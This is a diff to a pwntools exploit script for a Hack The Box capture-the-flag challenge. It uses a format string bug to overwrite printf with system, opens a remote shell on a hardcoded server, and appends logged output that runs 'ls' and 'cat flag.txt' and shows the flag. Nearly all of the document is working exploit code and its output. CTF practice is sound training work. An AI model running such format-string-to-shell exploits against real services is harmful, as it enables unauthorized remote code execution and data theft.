@@ -1,5 +1,6 @@
 #Format String
 #https://www.youtube.com/watch?v=U42Yz97gmQc
+#NOT one gadget solution!
 
 from pwn import *
 
@@ -46,8 +47,7 @@ ip, port = '178.62.72.53', 30246
 io = remote(ip, port)
 
 def send_payload(payload):
-	io.sendlineafter('>', 1)
-	io.sendlineafter('>>', payload)
+	io.sendline(payload)
 	return io.recvline().strip()
 
 format_string = FmtStr(execute_fmt=send_payload, offset=5)
@@ -109,3 +109,23 @@ io.recv()
 io.sendline('sh')  # Printf is now called (but actually system) so we pass 'sh'
 
 io.interactive()
+
+'''
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    'ls\n'
+[DEBUG] Received 0x18 bytes:
+    'core\n'
+    'flag.txt\n'
+    'nightmare\n'
+core
+flag.txt
+nightmare
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    'cat flag.txt\n'
+[DEBUG] Received 0x18 bytes:
+    'HTB{ar3_y0u_w0k3_y3t!?}\n'
+HTB{ar3_y0u_w0k3_y3t!?}
+
+'''
